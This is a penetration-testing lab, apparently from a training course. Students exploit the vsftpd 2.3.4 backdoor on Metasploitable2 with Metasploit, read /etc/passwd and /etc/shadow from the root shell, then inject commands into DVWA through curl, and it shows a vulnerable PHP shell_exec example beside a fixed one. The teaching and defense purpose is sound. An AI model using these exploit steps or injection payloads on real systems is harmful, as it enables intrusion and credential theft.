# Lab 4: Exploitation with Metasploit

**Duration:** ~40 minutes  
**Difficulty:** Intermediate  
**Tools:** Metasploit Framework (msfconsole)

## 🎯 Objective

Use the Metasploit Framework to exploit a known vulnerability on Metasploitable2, gain a shell, and explore post-exploitation. Then try command injection on DVWA.

---

## 📖 Background

**Metasploit** is the world's most popular penetration testing framework. It provides:
- A database of **thousands of exploits** for known vulnerabilities
- **Payloads** — code that runs after successful exploitation
- **Post-exploitation modules** — for gathering data after gaining access

### The Exploit Lifecycle:
```
Recon → Vulnerability Discovery → Exploit Selection → Exploitation → Post-Exploitation
 Lab 1      Lab 3                    Lab 4 (now)        Lab 4           Lab 4
```

---

## Part A: Exploiting vsftpd 2.3.4 Backdoor

In Lab 3, you discovered that Metasploitable runs **vsftpd 2.3.4**, which has a known backdoor (CVE-2011-2523). Let's exploit it.

### Step 1: Launch Metasploit

```bash
docker exec -it kali bash
msfconsole
```

Wait for the banner to load (this takes 15-30 seconds). You'll see:
```
msf6 >
```

### Step 2: Search for the Exploit

```
msf6 > search vsftpd
```

Expected output:
```
Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Description
   -  ----                                  ---------------  ----       -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

### Step 3: Select the Exploit

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

Your prompt changes to:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

### Step 4: View Required Options

```
msf6 exploit(...) > show options
```

```
Module options:
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port
```

### Step 5: Set the Target

```
msf6 exploit(...) > set RHOSTS 10.10.10.30
```

### Step 6: Run the Exploit!

```
msf6 exploit(...) > run
```

If successful, you'll see:
```
[*] 10.10.10.30:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.30:21 - USER: 331 Please specify the password.
[+] 10.10.10.30:21 - Backdoor service has been spawned, handling...
[+] 10.10.10.30:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

### 🎉 You now have a ROOT shell on the target!

### Step 7: Explore the Compromised System

You're now typing commands **on the Metasploitable server**, not on Kali:

```bash
# Who are you?
whoami
# Output: root

# What system is this?
uname -a
# Output: Linux metasploitable 2.6.24-16-server ...

# View all users
cat /etc/passwd

# View password hashes (only root can do this!)
cat /etc/shadow

# List home directories
ls /home/

# Check network configuration
ifconfig
```

### 📝 Questions:
1. What user did you gain access as? Why is this particularly dangerous?
2. How many user accounts exist on the system? (`wc -l /etc/passwd`)
3. Can you find any interesting files in user home directories?

### Step 8: Exit the Shell

```bash
exit
```

Then back in Metasploit:
```
msf6 exploit(...) > back
```

---

## Part B: DVWA Command Injection

Now let's exploit a web application vulnerability manually.

### Step 9: Command Injection via curl

DVWA's Command Injection page lets you ping an IP address. But it doesn't sanitize input properly.

First, let's do it the intended way from Kali (in a new terminal or after exiting msfconsole):

```bash
# Normal request — ping a host
curl -s -b "security=low; PHPSESSID=test" \
  "http://10.10.10.20/vulnerabilities/exec/" \
  --data-urlencode "ip=10.10.10.10&Submit=Submit"
```

Now, inject a command:
```bash
# Command injection — append a second command
curl -s -b "security=low; PHPSESSID=test" \
  "http://10.10.10.20/vulnerabilities/exec/" \
  --data-urlencode "ip=10.10.10.10;whoami&Submit=Submit"
```

> **Note:** You may need to log into DVWA first via the browser and get a valid `PHPSESSID` cookie. Alternatively, use DVWA directly from a browser on your host machine.

### Step 10: Try Increasingly Dangerous Commands

Each of these demonstrates what an attacker could do:

```bash
# Read system files
ip=10.10.10.10; cat /etc/passwd

# List the web application files
ip=10.10.10.10; ls -la /var/www/html/

# View DVWA's database configuration
ip=10.10.10.10; cat /var/www/html/config/config.inc.php

# Check what user the web server runs as
ip=10.10.10.10; id
```

### Why this is critical:
In real applications, command injection can lead to:
- Reading sensitive files (databases, configs, credentials)
- Installing backdoors
- Pivoting to other systems on the network
- Complete server takeover

---

## 🛡️ How to Prevent These Attacks

### vsftpd Backdoor:
- **Keep software updated** — this was a supply chain attack; the malicious code was in the official download
- **Verify checksums** of downloaded software
- **Monitor for unusual network connections**

### Command Injection:
```php
// ❌ VULNERABLE — directly uses user input in shell command
$output = shell_exec("ping -c 4 " . $_POST['ip']);

// ✅ SAFE — validates input is actually an IP address
$ip = $_POST['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
} else {
    $output = "Invalid IP address.";
}
```

**Key defenses:**
1. **Input validation** — Only allow expected characters
2. **Parameterized commands** — Use `escapeshellarg()` or avoid shell entirely
3. **Least privilege** — Don't run web servers as root
4. **WAF** — Web Application Firewalls can block common injection patterns

---

## 🏆 Summary

| Skill | What you did |
|-------|-------------|
| Metasploit basics | `search`, `use`, `set`, `run` |
| Remote exploitation | Gained root shell via vsftpd backdoor |
| Post-exploitation | Explored compromised system, read sensitive files |
| Web exploitation | Command injection via unsanitized input |
| Defense understanding | Input validation, parameterization, least privilege |

---

## ➡️ Next: [Lab 5: Mini CTF Challenge](lab5-ctf.md) — Put everything together!
